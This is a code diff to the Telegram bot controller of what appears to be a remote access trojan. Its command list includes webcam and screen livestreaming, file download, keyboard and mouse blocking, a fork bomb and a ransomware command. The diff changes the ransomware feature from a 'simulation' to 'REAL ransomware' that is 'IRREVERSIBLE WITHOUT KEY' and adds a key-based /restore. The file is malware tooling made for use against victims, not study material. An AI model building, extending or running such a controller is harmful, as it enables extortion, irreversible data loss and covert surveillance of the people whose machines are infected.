@@ -1,6 +1,6 @@
 # api/index.py
 # FINAL VERSION - Added input and process blocking commands.
-# ADDED - Forkbomb and Ransomware simulation commands.
+# ADDED - Replaced ransomware simulation with a fully functional version.
 
 import os
 import re
@@ -109,8 +109,8 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "*💣 DESTRUCTIVE & ADVANCED*\n"
         "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
         "`/cancelforkbomb` \\- Stop the fork bomb\n"
-        "`/ransomware` \\- ⚠️ *SIMULATION*\\. Reversibly encrypts files\n"
-        "`/restore` \\- Restores files from ransomware simulation\n"
+        "`/ransomware` \\- ☢️ *DANGEROUS*\\. Deploys REAL ransomware\\. *IRREVERSIBLE WITHOUT KEY*\\.\n"
+        "`/restore <key>` \\- Restores files using the provided key\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
@@ -195,7 +195,6 @@ agent_commands = [
     "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", 
     "pwd", "download", "blockkeyboard", "unblockkeyboard", "blockmouse", 
     "unblockmouse", "startblocker", "stopblocker",
-    # --- NEW --- Added commands
     "forkbomb", "cancelforkbomb", "ransomware", "restore"
 ]
 for cmd in agent_commands:
